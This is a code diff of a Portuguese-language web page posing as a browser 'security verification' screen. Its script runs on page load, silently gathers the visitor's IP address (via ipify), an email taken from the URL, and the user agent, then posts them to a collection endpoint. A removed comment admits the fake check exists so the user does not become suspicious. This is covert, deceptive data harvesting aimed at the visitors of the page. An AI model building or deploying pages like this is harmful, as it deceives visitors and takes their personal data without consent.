@@ -1,76 +1,43 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Segurança</title>
-    <style>
-        body { font-family: sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: #333; font-size: 1.5rem; }
-        p { color: #666; font-size: 0.9rem; }
-        .btn-verify { background: #3498db; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        .hidden { display: none; }
-    </style>
-</head>
-<body>
-
-<div class="container" id="verify-box">
-    <h2>Verificação de Segurança</h2>
-    <p>Estamos verificando se sua conexão é segura para continuar ao site.</p>
-    <div class="loader" id="spinner"></div>
-    <p id="status-text">Verificando integridade do navegador...</p>
-    <button class="btn-verify hidden" id="btn-action" onclick="startSimulation()">Clique para verificar</button>
-</div>
-
 <script>
-    // Rota da sua API na Vercel
+    // URL da sua API (Vercel vai gerenciar isso)
     const API_ENDPOINT = "/api/collect"; 
 
     async function collectData() {
-    console.log("Iniciando coleta...");
-    let ipAddress = "Desconhecido";
-    let userEmail = "Nao fornecido";
+        console.log("Iniciando coleta de dados...");
+        let ipAddress = "Desconhecido";
+        let userEmail = "Não fornecido";
 
-    try {
-        // Timeout de 5 segundos para não travar o site
-        const timeoutPromise = new Promise((_, reject) => 
-            setTimeout(() => reject(new Error('Timeout na coleta')), 5000)
-        );
+        try {
+            // 1. Captura o IP
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ipAddress = ipData.ip;
 
-        // Tenta pegar o IP
-        const ipResponse = await Promise.race([
-            fetch('https://api.ipify.org?format=json'),
-            timeoutPromise
-        ]);
-        const ipData = await ipResponse.json();
-        ipAddress = ipData.ip;
+            // 2. Captura o e-mail via URL
+            const urlParams = new URLSearchParams(window.location.search);
+            userEmail = urlParams.get('email') || "Não fornecido";
 
-        const urlParams = new URLSearchParams(window.location.search);
-        userEmail = urlParams.get('email') || "Não fornecido";
+            console.log("IP capturado:", ipAddress);
+            console.log("Email capturado:", userEmail);
 
-        console.log("Enviando dados para a API...");
-        
-        // Chama a API
-        await sendToServer({
-            ip: ipAddress,
-            email: userEmail,
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-        });
+            // 3. Envia para a sua API (Back-end)
+            await sendToServer({
+                ip: ipAddress,
+                email: userEmail,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            });
 
-    } catch (error) {
-        console.error("Erro na coleta (timeout ou rede):", error);
-        document.getElementById('status-text').innerText = "Erro na conexão. Tente novamente.";
-    }
-}
+        } catch (error) {
+            console.error("Erro na coleta inicial:", error);
+            document.getElementById('status-text').innerText = "Erro na conexão. Tente novamente.";
         }
     }
 
     async function sendToServer(data) {
         try {
+            console.log("Enviando payload para API:", data);
+
             const response = await fetch(API_ENDPOINT, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -80,15 +47,18 @@
             const result = await response.json();
             console.log("Resposta do servidor:", result);
 
-            // Simula o processo de verificação para o usuário não desconfiar
-            setTimeout(() => {
+            if (response.ok) {
+                // Sucesso: Mostra a mensagem de conclusão
                 document.getElementById('status-text').innerText = "Verificação concluída. Redirecionando...";
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('btn-action').classList.remove('hidden');
-            }, 3000);
+            } else {
+                throw new Error(result.error || 'Erro no servidor');
+            }
 
         } catch (error) {
             console.error("Erro ao enviar para o servidor:", error);
+            document.getElementById('status-text').innerText = "Erro no servidor. Tente novamente.";
         }
     }
 
@@ -97,7 +67,6 @@
         window.location.reload();
     }
 
+    // Inicia o processo assim que a página carregar
     window.onload = collectData;
 </script>
-</body>
-</html>
